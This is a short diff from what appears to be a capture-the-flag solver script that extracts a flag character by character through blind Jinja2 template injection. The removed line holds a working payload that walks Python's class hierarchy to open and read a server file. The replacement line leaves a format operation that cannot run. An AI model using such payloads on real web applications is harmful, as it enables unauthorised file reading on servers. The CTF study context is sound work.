@@ -182,7 +182,7 @@ flag = ''
 for i in range(0,50):
     for j in range(0,len(chars)):
         data = {
-            "text" : "{%% if request.values.e[%d] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[%d]%%}getflag{%%endif%%}" % (j,i),
+            "text" : "" % (j,i),
             "a" : "__class__",
             "b" : "__base__",
             "c" : "__subclasses__",
